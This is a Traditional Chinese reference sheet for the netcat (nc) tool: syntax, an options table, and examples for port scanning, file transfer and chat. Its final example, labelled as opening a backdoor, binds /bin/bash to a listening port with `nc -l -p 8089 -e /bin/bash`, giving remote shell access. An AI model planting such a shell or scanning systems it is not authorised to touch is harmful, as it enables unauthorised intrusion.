# nc(netcat)

- 用途：用於網路的cat，檢查port有沒有通，支援多種協定

## 語法

```shell
nc [OPTIONS] [hostname] [port]
```

## 參數

| 參數                      | 說明                                              |
| ------------------------- | ------------------------------------------------- |
| -4                        | 只使用IPv4                                        |
| -6                        | 只使用IPv6                                        |
| -U, --unixsock            | 只使用unixsock                                    |
| -C, --crlf                | Use CRLF for EOL sequence                         |
| -c, --sh-exec \<command>  | 透過/bin/sh執行給定的command                      |
| -e, --exec \<command>     | 執行給定的command                                 |
| --lua-exec \<filename>    | 執行給定的lua script                              |
| -g hop1[,hop2,...]        | Loose source routing hop points (8 max)           |
| -G \<n>                    | Loose source routing hop pointer (4, 8, 12, ...)  |
| -m, --max-conns \<n>       | 最大連線數設定                                    |
| -d, --delay \<time>        | Wait between read/writes                          |
| -o, --output \<filename>   | Dump session data to a file                       |
| -x, --hex-dump \<filename> | Dump session data as hex to a file                |
| -i, --idle-timeout \<time> | Idle read/write timeout                           |
| -p, --source-port port    | 指定要使用的port                                  |
| -s, --source addr         | Specify source address to use (doesn't affect -l) |
| -l, --listen              | 綁定port並開始監聽連線                            |
| -k, --keep-open           | 保持連線                                          |
| -n, --nodns               | 不透過dns解析hostname                             |
| -t, --telnet              | Answer Telnet negotiations                        |
| -u, --udp                 | 使用UDP，預設為TCP                                |
| --sctp                    | 使用SCTP，預設為TCP                               |
| -v, --verbose             | 顯示執行過程，可添加多個v變更詳細                 |
| -w, --wait \<time>         | 連線timeout                                       |
| -z                        | Zero-I/O mode，只回傳連接狀態                     |
| --append-output           | Append rather than clobber specified output files |
| --send-only               | 只傳送資料                                        |
| --recv-only               | 只接收資料                                        |
| --allow                   | 只允許給定的host去連接                            |
| --allowfile               | 只允許給定的hosts檔去連接                         |
| --deny                    | 拒絕給定的host去連接                              |
| --denyfile                | 拒絕給定的hosts檔去連接                           |
| --broker                  | Enable Ncat's connection brokering mode           |
| --chat                    | Start a simple Ncat chat server                   |
| --proxy \<addr[:port]>     | 指定proxy address                                 |
| --proxy-type \<type>       | 指定proxy type                                    |
| --proxy-auth \<auth>       | 設定proxy的驗證                                   |
| --ssl                     | 透過SSL連線或監聽                                 |
| --ssl-cert                | 指定ssl cert file去監聽                           |
| --ssl-key                 | 指定ssl key去監聽                                 |
| --ssl-verify              | Verify trust and domain name of certificates      |
| --ssl-trustfile           | PEM file containing trusted SSL certificates      |
| --ssl-ciphers             | Cipherlist containing SSL ciphers to use          |

## 基本操作
1. 遠端機器掃描port
```shell
# 指定ip 192.168.0.1上的1-1000與2000-3000這兩個範圍的TCP連接阜，看哪些有開啟
nc -vnz -w 1 192.168.0.1 1-1000 2000-3000

# 指定ip 192.168.0.1上的所有udp連接阜進行掃描
nc -vnzu 192.168.0.1 1-65535
```

2. 傳送檔案或目錄
```shell
#在5000 port上接收myfile檔案 
server
nc -l 5000 > myfile

client
nc server_ip_or_host 5000 < myfile

#在5000 port上接收目錄
server
nc -l 5000 | tar xvf -

client
tar cvf - /path/to/dir | nc server_ip_or_host 5000
```

3. 建立session
```shell
# 在5000 port上聊天
server
nc -4 -l -p 5000

client
nc server_ip_or_host 5000
```

4. server開後門
```shell
# 在8089 port上留給client執行bash
server
nc -4 -l -vv -p 8089 -e /bin/bash

client
nc 192.168.56.147 8089
```

## 參考資料
* https://blog.gtwang.org/linux/linux-utility-netcat-examples/
* https://iter01.com/608959.html
* https://www.tecmint.com/netcat-nc-command-examples/
* https://www.gushiciku.cn/pl/gazb/zh-tw
## 相關指令
* telnet
* nmap